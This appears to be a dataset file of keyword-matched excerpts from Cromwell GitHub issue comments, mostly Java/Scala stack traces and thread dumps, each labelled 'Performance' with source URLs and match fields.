Performance,"otImplementedError: This should not happen, please report this; 	at cromwell.backend.impl.sfs.config.DispatchedConfigAsyncJobExecutionActor.pollStatus(ConfigAsyncJobExecutionActor.scala:281); 	at cromwell.backend.impl.sfs.config.DispatchedConfigAsyncJobExecutionActor.pollStatus(ConfigAsyncJobExecutionActor.scala:211); 	at cromwell.backend.standard.StandardAsyncExecutionActor.$anonfun$pollStatusAsync$1(StandardAsyncExecutionActor.scala:697); 	at scala.util.Try$.apply(Try.scala:209); 	... 25 more. [2019-02-13 22:18:20,91] [error] WorkflowManagerActor Workflow bc35173d-fde7-4727-8ae1-d4d3f132296c failed (during ExecutingWorkflowState): java.util.concurrent.ExecutionException: Boxed Error; 	at scala.concurrent.impl.Promise$.resolver(Promise.scala:83); 	at scala.concurrent.impl.Promise$.scala$concurrent$impl$Promise$$resolveTry(Promise.scala:75); 	at scala.concurrent.impl.Promise$KeptPromise$.apply(Promise.scala:402); 	at scala.concurrent.Promise$.fromTry(Promise.scala:138); 	at scala.concurrent.Future$.fromTry(Future.scala:635); 	at cromwell.backend.standard.StandardAsyncExecutionActor.pollStatusAsync(StandardAsyncExecutionActor.scala:697); 	at cromwell.backend.standard.StandardAsyncExecutionActor.pollStatusAsync$(StandardAsyncExecutionActor.scala:697); 	at cromwell.backend.impl.sfs.config.DispatchedConfigAsyncJobExecutionActor.pollStatusAsync(ConfigAsyncJobExecutionActor.scala:211); 	at cromwell.backend.standard.StandardAsyncExecutionActor.poll(StandardAsyncExecutionActor.scala:989); 	at cromwell.backend.standard.StandardAsyncExecutionActor.poll$(StandardAsyncExecutionActor.scala:983); 	at cromwell.backend.impl.sfs.config.DispatchedConfigAsyncJobExecutionActor.poll(ConfigAsyncJobExecutionActor.scala:211); 	at cromwell.backend.async.AsyncBackendJobExecutionActor.$anonfun$robustPoll$1(AsyncBackendJobExecutionActor.scala:76); 	at cromwell.core.retry.Retry$.withRetry(Retry.scala:38); 	at cromwell.backend.async.AsyncBackendJobExecutionActor.withRetry(AsyncBackendJobExecution",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4560#issuecomment-463475710:4221,concurren,concurrent,4221,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4560#issuecomment-463475710,1,['concurren'],['concurrent']
Performance,ox.processMailbox(Mailbox.scala:258); 	at akka.dispatch.Mailbox.run(Mailbox.scala:225); 	at akka.dispatch.Mailbox.exec(Mailbox.scala:235); 	at akka.dispatch.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260); 	at akka.dispatch.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339); 	at akka.dispatch.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979); 	at akka.dispatch.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107); Caused by: java.util.ServiceConfigurationError: software.amazon.awssdk.http.SdkHttpService: Provider software.amazon.awssdk.http.apache.ApacheSdkHttpService not found; 	at java.util.ServiceLoader.fail(ServiceLoader.java:239); 	at java.util.ServiceLoader.access$300(ServiceLoader.java:185); 	at java.util.ServiceLoader$LazyIterator.nextService(ServiceLoader.java:372); 	at java.util.ServiceLoader$LazyIterator.next(ServiceLoader.java:404); 	at java.util.ServiceLoader$1.next(ServiceLoader.java:480); 	at software.amazon.awssdk.core.internal.http.loader.ClasspathSdkHttpServiceProvider.loadService(ClasspathSdkHttpServiceProvider.java:53); 	at java.util.stream.ReferencePipeline$3$1.accept(ReferencePipeline.java:193); 	at java.util.Spliterators$ArraySpliterator.tryAdvance(Spliterators.java:958); 	at java.util.stream.ReferencePipeline.forEachWithCancel(ReferencePipeline.java:126); 	at java.util.stream.AbstractPipeline.copyIntoWithCancel(AbstractPipeline.java:498); 	at java.util.stream.AbstractPipeline.copyInto(AbstractPipeline.java:485); 	at java.util.stream.AbstractPipeline.wrapAndCopyInto(AbstractPipeline.java:471); 	at java.util.stream.FindOps$FindOp.evaluateSequential(FindOps.java:152); 	at java.util.stream.AbstractPipeline.evaluate(AbstractPipeline.java:234); 	at java.util.stream.ReferencePipeline.findFirst(ReferencePipeline.java:464); 	at software.amazon.awssdk.core.internal.http.loader.SdkHttpServiceProviderChain.loadService(SdkHttpServiceProviderChain.java:44); 	at software.amazon.awssdk.core.internal.http.loader.CachingSdkHttp,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5056#issuecomment-507840273:6243,load,loader,6243,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5056#issuecomment-507840273,2,['load'],['loader']
Performance,pLike$MappedValues.foreach(MapLike.scala:245) ~[cromwell.jar:0.19]; 905195- at scala.collection.TraversableLike$class.map(TraversableLike.scala:245) ~[cromwell.jar:0.19]; 905196- at scala.collection.AbstractTraversable.map(Traversable.scala:104) ~[cromwell.jar:0.19]; 905197- at cromwell.engine.db.slick.SlickDataAccess$$anonfun$46.apply(SlickDataAccess.scala:569) ~[cromwell.jar:0.19]; 905198- at cromwell.engine.db.slick.SlickDataAccess$$anonfun$46.apply(SlickDataAccess.scala:568) ~[cromwell.jar:0.19]; 905199- at slick.backend.DatabaseComponent$DatabaseDef$$anonfun$runInContext$1.apply(DatabaseComponent.scala:146) ~[cromwell.jar:0.19]; 905200- at slick.backend.DatabaseComponent$DatabaseDef$$anonfun$runInContext$1.apply(DatabaseComponent.scala:146) ~[cromwell.jar:0.19]; 905201- at scala.concurrent.Future$$anonfun$flatMap$1.apply(Future.scala:251) ~[cromwell.jar:0.19]; 905202- at scala.concurrent.Future$$anonfun$flatMap$1.apply(Future.scala:249) ~[cromwell.jar:0.19]; 905203- at scala.concurrent.impl.CallbackRunnable.run_aroundBody0(Promise.scala:32) ~[cromwell.jar:0.19]; 905204- at scala.concurrent.impl.CallbackRunnable$AjcClosure1.run(Promise.scala:1) ~[cromwell.jar:0.19]; 905205- at org.aspectj.runtime.reflect.JoinPointImpl.proceed(JoinPointImpl.java:149) ~[cromwell.jar:0.19]; 905206- at kamon.scala.instrumentation.FutureInstrumentation$$anonfun$aroundExecution$1.apply(FutureInstrumentation.scala:44) ~[cromwell.jar:0.19]; 905207- at kamon.trace.Tracer$.withContext(TracerModule.scala:53) ~[cromwell.jar:0.19]; 905208- at kamon.scala.instrumentation.FutureInstrumentation.aroundExecution(FutureInstrumentation.scala:43) ~[cromwell.jar:0.19]; 905209- at scala.concurrent.impl.CallbackRunnable.run(Promise.scala:31) ~[cromwell.jar:0.19]; 905210- at scala.concurrent.impl.ExecutionContextImpl$AdaptedForkJoinTask.exec(ExecutionContextImpl.scala:121) ~[cromwell.jar:0.19]; 905211- at scala.concurrent.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260) [cromwell.jar:0.19]; 905212- at,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/738#issuecomment-214521102:6352,concurren,concurrent,6352,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/738#issuecomment-214521102,1,['concurren'],['concurrent']
Performance,"patchers.engine-dispatcher-47 INFO - MaterializeWorkflowDescriptorActor [UUID(dd0b1399)]: Parsing workflow as WDL draft-2; 2018-06-07 12:16:52,498 cromwell-system-akka.dispatchers.engine-dispatcher-47 ERROR - WorkflowManagerActor Workflow dd0b1399-ebb6-4d9b-89ea-7da193994220 failed (during MaterializingWorkflowDescriptorState): cromwell.engine.workflow.lifecycle.materialization.MaterializeWorkflowDescriptorActor$$anon$1: Workflow input processing failed:; Boxed Error; scala.concurrent.impl.Promise$.resolver(Promise.scala:83); scala.concurrent.impl.Promise$.scala$concurrent$impl$Promise$$resolveTry(Promise.scala:75); scala.concurrent.impl.Promise$DefaultPromise.tryComplete(Promise.scala:280); scala.concurrent.Promise.complete(Promise.scala:49); scala.concurrent.Promise.complete$(Promise.scala:48); scala.concurrent.impl.Promise$DefaultPromise.complete(Promise.scala:183); scala.concurrent.Promise.failure(Promise.scala:100); scala.concurrent.Promise.failure$(Promise.scala:100); scala.concurrent.impl.Promise$DefaultPromise.failure(Promise.scala:183); cats.effect.IO.$anonfun$unsafeToFuture$2(IO.scala:328); scala.util.Either.fold(Either.scala:189); cats.effect.IO.$anonfun$unsafeToFuture$1(IO.scala:328); cats.effect.IO.$anonfun$unsafeToFuture$1$adapted(IO.scala:328); cats.effect.internals.IORunLoop$.cats$effect$internals$IORunLoop$$loop(IORunLoop.scala:98); cats.effect.internals.IORunLoop$.start(IORunLoop.scala:35); cats.effect.IO.unsafeRunAsync(IO.scala:257); cats.effect.IO.unsafeToFuture(IO.scala:328); cromwell.engine.workflow.lifecycle.materialization.MaterializeWorkflowDescriptorActor$$anonfun$1.$anonfun$applyOrElse$1(MaterializeWorkflowDescriptorActor.scala:146); scala.concurrent.Future.$anonfun$flatMap$1(Future.scala:303); scala.concurrent.impl.Promise.$anonfun$transformWith$1(Promise.scala:37); scala.concurrent.impl.CallbackRunnable.run(Promise.scala:60); akka.dispatch.BatchingExecutor$AbstractBatch.processBatch(BatchingExecutor.scala:55); akka.dispatch.BatchingExecut",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3736#issuecomment-395480457:99509,concurren,concurrent,99509,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3736#issuecomment-395480457,1,['concurren'],['concurrent']
Performance,"port.park(LockSupport.java:175); at java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject.await(AbstractQueuedSynchronizer.java:2039); at java.util.concurrent.LinkedBlockingQueue.take(LinkedBlockingQueue.java:442); at java.util.concurrent.ThreadPoolExecutor.getTask(ThreadPoolExecutor.java:1067); at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1127); at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:617); at java.lang.Thread.run(Thread.java:745); ....snip.... ""ForkJoinPool-2-worker-29"" #38 daemon prio=5 os_prio=0 tid=0x00007fdaf4001000 nid=0xa0e waiting on condition [0x00007fdb8073c000]; java.lang.Thread.State: WAITING (parking); at sun.misc.Unsafe.park(Native Method); - parking to wait for <0x000000015b540500> (a scala.concurrent.forkjoin.ForkJoinPool); at scala.concurrent.forkjoin.ForkJoinPool.scan(ForkJoinPool.java:2075); at scala.concurrent.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979); at scala.concurrent.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107). ""db-1"" #37 daemon prio=5 os_prio=0 tid=0x00007fdaf833e800 nid=0xa0d waiting on condition [0x00007fdb80ad0000]; java.lang.Thread.State: WAITING (parking); at sun.misc.Unsafe.park(Native Method); - parking to wait for <0x000000015b76aed8> (a java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject); at java.util.concurrent.locks.LockSupport.park(LockSupport.java:175); at java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject.await(AbstractQueuedSynchronizer.java:2039); at slick.util.ManagedArrayBlockingQueue$$anonfun$take$1.apply(ManagedArrayBlockingQueue.scala:105); at slick.util.ManagedArrayBlockingQueue.lockedInterruptibly(ManagedArrayBlockingQueue.scala:265); at slick.util.ManagedArrayBlockingQueue.take(ManagedArrayBlockingQueue.scala:104); at java.util.concurrent.ThreadPoolExecutor.getTask(ThreadPoolExecutor.java:1067); at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExe",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1649#issuecomment-258913914:3570,concurren,concurrent,3570,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1649#issuecomment-258913914,1,['concurren'],['concurrent']
Performance,"pply(Try.scala:192); 	at scala.util.Success.map(Try.scala:237); 	at scala.concurrent.Future$$anonfun$map$1.apply(Future.scala:237); 	at scala.concurrent.Future$$anonfun$map$1.apply(Future.scala:237); 	at scala.concurrent.impl.CallbackRunnable.run(Promise.scala:32); 	at akka.dispatch.BatchingExecutor$AbstractBatch.processBatch(BatchingExecutor.scala:55); 	at akka.dispatch.BatchingExecutor$BlockableBatch$$anonfun$run$1.apply$mcV$sp(BatchingExecutor.scala:91); 	at akka.dispatch.BatchingExecutor$BlockableBatch$$anonfun$run$1.apply(BatchingExecutor.scala:91); 	at akka.dispatch.BatchingExecutor$BlockableBatch$$anonfun$run$1.apply(BatchingExecutor.scala:91); 	at scala.concurrent.BlockContext$.withBlockContext(BlockContext.scala:72); 	at akka.dispatch.BatchingExecutor$BlockableBatch.run(BatchingExecutor.scala:90); 	at akka.dispatch.TaskInvocation.run(AbstractDispatcher.scala:39); 	at akka.dispatch.ForkJoinExecutorConfigurator$AkkaForkJoinTask.exec(AbstractDispatcher.scala:415); 	at scala.concurrent.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260); 	at scala.concurrent.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339); 	at scala.concurrent.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979); 	at scala.concurrent.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107); ```; ```; $ tail -n 10 stderr; Traceback (most recent call last):; File ""/src/Merge_MAFs.py"", line 182, in <module>; main(sys.argv[1:]); File ""/src/Merge_MAFs.py"", line 76, in main; concatenatedMafFilename = _handle_mafs(args); File ""/src/Merge_MAFs.py"", line 83, in _handle_mafs; mafPaths = _getMafPaths(args.mafpaths); File ""/src/Merge_MAFs.py"", line 98, in _getMafPaths; raise Exception(""MAF doesn't exist: %s"" % mafPath); Exception: MAF doesn't exist: /Users/dheiman/Documents/workspace/gdac-firecloud/tasks/aggregate_mafs/cromwell-executions/aggregate_mafs_workflow/814c47aa-9d11-4c81-a08c-f2b77c002b46/call-aggregate_mafs/inputs/Users/dheiman/Documents/workspace/gdac-firecloud/tasks/a",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1875#issuecomment-274088918:6869,concurren,concurrent,6869,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1875#issuecomment-274088918,1,['concurren'],['concurrent']
Performance,"pport.java:175); at java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject.await(AbstractQueuedSynchronizer.java:2039); at slick.util.ManagedArrayBlockingQueue$$anonfun$take$1.apply(ManagedArrayBlockingQueue.scala:105); at slick.util.ManagedArrayBlockingQueue.lockedInterruptibly(ManagedArrayBlockingQueue.scala:265); at slick.util.ManagedArrayBlockingQueue.take(ManagedArrayBlockingQueue.scala:104); at java.util.concurrent.ThreadPoolExecutor.getTask(ThreadPoolExecutor.java:1067); at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1127); at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:617); at java.lang.Thread.run(Thread.java:745). ""Hikari Housekeeping Timer (pool db)"" #35 daemon prio=5 os_prio=0 tid=0x00007fdaf8212800 nid=0xa0b waiting on condition [0x00007fdb80cd2000]; java.lang.Thread.State: TIMED_WAITING (parking); at sun.misc.Unsafe.park(Native Method); - parking to wait for <0x000000015b74b1f0> (a java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject); at java.util.concurrent.locks.LockSupport.parkNanos(LockSupport.java:215); at java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject.awaitNanos(AbstractQueuedSynchronizer.java:2078); at java.util.concurrent.ScheduledThreadPoolExecutor$DelayedWorkQueue.take(ScheduledThreadPoolExecutor.java:1093); at java.util.concurrent.ScheduledThreadPoolExecutor$DelayedWorkQueue.take(ScheduledThreadPoolExecutor.java:809); at java.util.concurrent.ThreadPoolExecutor.getTask(ThreadPoolExecutor.java:1067); at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1127); at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:617); at java.lang.Thread.run(Thread.java:745). ""Abandoned connection cleanup thread"" #34 daemon prio=5 os_prio=0 tid=0x00007fdaf81fc000 nid=0xa0a in Object.wait() [0x00007fdb80fd3000]; java.lang.Thread.State: TIMED_WAITING (on object monitor); at java.lang.Object.wait(Nativ",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1649#issuecomment-258913914:5007,concurren,concurrent,5007,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1649#issuecomment-258913914,1,['concurren'],['concurrent']
Performance,"python-36.pyc: no space left on device\n""); 	at cromwell.backend.google.pipelines.common.PipelinesApiAsyncBackendJobExecutionActor$.StandardException(PipelinesApiAsyncBackendJobExecutionActor.scala:79); 	at cromwell.backend.google.pipelines.common.PipelinesApiAsyncBackendJobExecutionActor.handleFailedRunStatus$1(PipelinesApiAsyncBackendJobExecutionActor.scala:585); 	at ; cromwell.backend.google.pipelines.common.PipelinesApiAsyncBackendJobExecutionActor.handleExecutionFailure(PipelinesApiAsyncBackendJobExecutionActor.scala:592); 	at cromwell.backend.google.pipelines.common.PipelinesApiAsyncBackendJobExecutionActor.handleExecutionFailure(PipelinesApiAsyncBackendJobExecutionActor.scala:83); 	at cromwell.backend.standard.StandardAsyncExecutionActor$$anonfun$handleExecutionResult$5.applyOrElse(StandardAsyncExecutionActor.scala:1099); 	at cromwell.backend.standard.StandardAsyncExecutionActor$$anonfun$handleExecutionResult$5.applyOrElse(StandardAsyncExecutionActor.scala:1095); 	at scala.concurrent.Future.$anonfun$recoverWith$1(Future.scala:413); 	at scala.concurrent.impl.Promise.$anonfun$transformWith$1(Promise.scala:37); 	at scala.concurrent.impl.CallbackRunnable.run(Promise.scala:60); 	at akka.dispatch.BatchingExecutor$AbstractBatch.processBatch(BatchingExecutor.scala:55); 	at akka.dispatch.BatchingExecutor$BlockableBatch.$anonfun$run$1(BatchingExecutor.scala:91); 	at scala.runtime.java8.JFunction0$mcV$sp.apply(JFunction0$mcV$sp.java:12); 	at scala.concurrent.BlockContext$.withBlockContext(BlockContext.scala:81); 	at akka.dispatch.BatchingExecutor$BlockableBatch.run(BatchingExecutor.scala:91); 	at akka.dispatch.TaskInvocation.run(AbstractDispatcher.scala:40); 	at akka.dispatch.ForkJoinExecutorConfigurator$AkkaForkJoinTask.exec(ForkJoinExecutorConfigurator.scala:44); 	at akka.dispatch.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260); 	at akka.dispatch.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339); 	at akka.dispatch.forkjoin.ForkJoinPool.runWorker(ForkJ",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3861#issuecomment-455657495:2637,concurren,concurrent,2637,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3861#issuecomment-455657495,1,['concurren'],['concurrent']
Performance,quibaseUtils.scala:58); 11:09:46 cromwell-test_1 | 	at cromwell.database.migration.liquibase.LiquibaseUtils$.updateSchema(LiquibaseUtils.scala:31); 11:09:46 cromwell-test_1 | 	at cromwell.services.ServicesStore$EnhancedSqlDatabase$.$anonfun$initialized$1(ServicesStore.scala:11); 11:09:46 cromwell-test_1 | 	at cromwell.services.ServicesStore$EnhancedSqlDatabase$.$anonfun$initialized$1$adapted(ServicesStore.scala:11); 11:09:46 cromwell-test_1 | 	at cromwell.database.slick.SlickDatabase.$anonfun$withConnection$1(SlickDatabase.scala:96); 11:09:46 cromwell-test_1 | 	at slick.jdbc.SimpleJdbcAction.run(StreamingInvokerAction.scala:70); 11:09:46 cromwell-test_1 | 	at slick.jdbc.SimpleJdbcAction.run(StreamingInvokerAction.scala:69); 11:09:46 cromwell-test_1 | 	at slick.basic.BasicBackend$DatabaseDef$$anon$2.liftedTree1$1(BasicBackend.scala:275); 11:09:46 cromwell-test_1 | 	at slick.basic.BasicBackend$DatabaseDef$$anon$2.run(BasicBackend.scala:275); 11:09:46 cromwell-test_1 | 	at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1149); 11:09:46 cromwell-test_1 | 	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:624); 11:09:46 cromwell-test_1 | 	at java.lang.Thread.run(Thread.java:748); 11:09:46 cromwell-test_1 | Caused by: java.lang.NullPointerException: null; 11:09:46 cromwell-test_1 | 	at liquibase.sqlgenerator.SqlGeneratorFactory.getGenerators(SqlGeneratorFactory.java:123); 11:09:46 cromwell-test_1 | 	at liquibase.sqlgenerator.SqlGeneratorFactory.createGeneratorChain(SqlGeneratorFactory.java:189); 11:09:46 cromwell-test_1 | 	at liquibase.sqlgenerator.SqlGeneratorFactory.generateSql(SqlGeneratorFactory.java:221); 11:09:46 cromwell-test_1 | 	at liquibase.executor.AbstractExecutor.applyVisitors(AbstractExecutor.java:25); 11:09:46 cromwell-test_1 | 	at liquibase.executor.jvm.JdbcExecutor.access$700(JdbcExecutor.java:36); 11:09:46 cromwell-test_1 | 	at liquibase.executor.jvm.JdbcExecutor$QueryStatementCallback.doInStatement(Jd,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4328#issuecomment-434037766:4947,concurren,concurrent,4947,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4328#issuecomment-434037766,1,['concurren'],['concurrent']
Performance,r.cromwell$backend$impl$jes$JesAsyncBackendJobExecutionActor$$returnCodeContents(JesAsyncBackendJobExecutionActor.scala:110); 	at cromwell.backend.impl.jes.JesAsyncBackendJobExecutionActor$$anonfun$executionResult$1.apply(JesAsyncBackendJobExecutionActor.scala:548); 	at cromwell.backend.impl.jes.JesAsyncBackendJobExecutionActor$$anonfun$executionResult$1.apply(JesAsyncBackendJobExecutionActor.scala:538); 	at scala.concurrent.impl.Future$PromiseCompletingRunnable.liftedTree1$1(Future.scala:24); 	at scala.concurrent.impl.Future$PromiseCompletingRunnable.run(Future.scala:24); 	at akka.dispatch.TaskInvocation.run(AbstractDispatcher.scala:39); 	at akka.dispatch.ForkJoinExecutorConfigurator$AkkaForkJoinTask.exec(AbstractDispatcher.scala:415); 	at scala.concurrent.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260); 	at scala.concurrent.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339); 	at scala.concurrent.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979); 	at scala.concurrent.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107); Caused by: com.google.api.client.googleapis.json.GoogleJsonResponseException: 500 Internal Server Error; Backend Error; 	at com.google.api.client.googleapis.json.GoogleJsonResponseException.from(GoogleJsonResponseException.java:146); 	at com.google.api.client.googleapis.services.json.AbstractGoogleJsonClientRequest.newExceptionOnError(AbstractGoogleJsonClientRequest.java:113); 	at com.google.api.client.googleapis.services.json.AbstractGoogleJsonClientRequest.newExceptionOnError(AbstractGoogleJsonClientRequest.java:40); 	at com.google.api.client.googleapis.services.AbstractGoogleClientRequest$1.interceptResponse(AbstractGoogleClientRequest.java:321); 	at com.google.api.client.http.HttpRequest.execute(HttpRequest.java:1065); 	at com.google.api.client.googleapis.services.AbstractGoogleClientRequest.executeUnparsed(AbstractGoogleClientRequest.java:419); 	at com.google.api.client.googleapis.services.AbstractGoogleClientR,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1782#issuecomment-267025762:2981,concurren,concurrent,2981,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1782#issuecomment-267025762,1,['concurren'],['concurrent']
Performance,ractGoogleClientRequest.java:352) ~[cromwell.jar:0.19]; at com.google.api.client.googleapis.services.AbstractGoogleClientRequest.execute(AbstractGoogleClientRequest.java:469) ~[cromwell.jar:0.19]; at cromwell.engine.backend.jes.Run.status(Run.scala:133) ~[cromwell.jar:0.19]; at cromwell.engine.backend.jes.Run.checkStatus(Run.scala:146) ~[cromwell.jar:0.19]; at cromwell.engine.backend.jes.JesBackend$$anonfun$poll$1$$anonfun$42.apply(JesBackend.scala:892) ~[cromwell.jar:0.19]; at cromwell.engine.backend.jes.JesBackend$$anonfun$poll$1$$anonfun$42.apply(JesBackend.scala:892) ~[cromwell.jar:0.19]; at scala.util.Try$.apply(Try.scala:192) ~[cromwell.jar:0.19]; at cromwell.engine.backend.jes.JesBackend$$anonfun$poll$1.apply(JesBackend.scala:892) [cromwell.jar:0.19]; at cromwell.engine.backend.jes.JesBackend$$anonfun$poll$1.apply(JesBackend.scala:886) [cromwell.jar:0.19]; at scala.concurrent.impl.Future$PromiseCompletingRunnable.liftedTree1$1(Future.scala:24) [cromwell.jar:0.19]; at scala.concurrent.impl.Future$PromiseCompletingRunnable.run_aroundBody0(Future.scala:24) [cromwell.jar:0.19]; at scala.concurrent.impl.Future$PromiseCompletingRunnable$AjcClosure1.run(Future.scala:1) [cromwell.jar:0.19]; at org.aspectj.runtime.reflect.JoinPointImpl.proceed(JoinPointImpl.java:149) [cromwell.jar:0.19]; at kamon.scala.instrumentation.FutureInstrumentation$$anonfun$aroundExecution$1.apply(FutureInstrumentation.scala:44) [cromwell.jar:0.19]; at kamon.trace.Tracer$.withContext(TracerModule.scala:53) [cromwell.jar:0.19]; at kamon.scala.instrumentation.FutureInstrumentation.aroundExecution(FutureInstrumentation.scala:43) [cromwell.jar:0.19]; at scala.concurrent.impl.Future$PromiseCompletingRunnable.run(Future.scala:23) [cromwell.jar:0.19]; at akka.dispatch.TaskInvocation.run(AbstractDispatcher.scala:40) [cromwell.jar:0.19]; at akka.dispatch.ForkJoinExecutorConfigurator$AkkaForkJoinTask.exec(AbstractDispatcher.scala:397) [cromwell.jar:0.19]; at scala.concurrent.forkjoin.ForkJoinTask.doExec(,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/775#issuecomment-216661991:9370,concurren,concurrent,9370,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/775#issuecomment-216661991,1,['concurren'],['concurrent']
Performance,ractGoogleClientRequest.java:352) ~[cromwell.jar:0.19]; at com.google.api.client.googleapis.services.AbstractGoogleClientRequest.execute(AbstractGoogleClientRequest.java:469) ~[cromwell.jar:0.19]; at cromwell.engine.backend.jes.Run.status(Run.scala:143) ~[cromwell.jar:0.19]; at cromwell.engine.backend.jes.Run.checkStatus(Run.scala:156) ~[cromwell.jar:0.19]; at cromwell.engine.backend.jes.JesBackend$$anonfun$poll$1$$anonfun$42.apply(JesBackend.scala:933) ~[cromwell.jar:0.19]; at cromwell.engine.backend.jes.JesBackend$$anonfun$poll$1$$anonfun$42.apply(JesBackend.scala:933) ~[cromwell.jar:0.19]; at scala.util.Try$.apply(Try.scala:192) ~[cromwell.jar:0.19]; at cromwell.engine.backend.jes.JesBackend$$anonfun$poll$1.apply(JesBackend.scala:933) [cromwell.jar:0.19]; at cromwell.engine.backend.jes.JesBackend$$anonfun$poll$1.apply(JesBackend.scala:927) [cromwell.jar:0.19]; at scala.concurrent.impl.Future$PromiseCompletingRunnable.liftedTree1$1(Future.scala:24) [cromwell.jar:0.19]; at scala.concurrent.impl.Future$PromiseCompletingRunnable.run(Future.scala:24) [cromwell.jar:0.19]; at akka.dispatch.TaskInvocation.run(AbstractDispatcher.scala:40) [cromwell.jar:0.19]; at akka.dispatch.ForkJoinExecutorConfigurator$AkkaForkJoinTask.exec(AbstractDispatcher.scala:397) [cromwell.jar:0.19]; at scala.concurrent.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260) [cromwell.jar:0.19]; at scala.concurrent.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339) [cromwell.jar:0.19]; at scala.concurrent.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979) [cromwell.jar:0.19]; at scala.concurrent.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107) [cromwell.jar:0.19]; ```. We suspect that of all the retries from the errors above plus the new succeeded tasks that now needed post processing created a backlog that may have cause Cromwell to become sluggish and eventually run out of memory. It may have also been the opposite direction where Cromwell becoming sluggish caused t,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1248#issuecomment-237583201:10492,concurren,concurrent,10492,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1248#issuecomment-237583201,1,['concurren'],['concurrent']
Performance,"rayBlockingQueue.scala:104); at java.util.concurrent.ThreadPoolExecutor.getTask(ThreadPoolExecutor.java:1067); at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1127); at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:617); at java.lang.Thread.run(Thread.java:745). ""Hikari Housekeeping Timer (pool db)"" #35 daemon prio=5 os_prio=0 tid=0x00007fdaf8212800 nid=0xa0b waiting on condition [0x00007fdb80cd2000]; java.lang.Thread.State: TIMED_WAITING (parking); at sun.misc.Unsafe.park(Native Method); - parking to wait for <0x000000015b74b1f0> (a java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject); at java.util.concurrent.locks.LockSupport.parkNanos(LockSupport.java:215); at java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject.awaitNanos(AbstractQueuedSynchronizer.java:2078); at 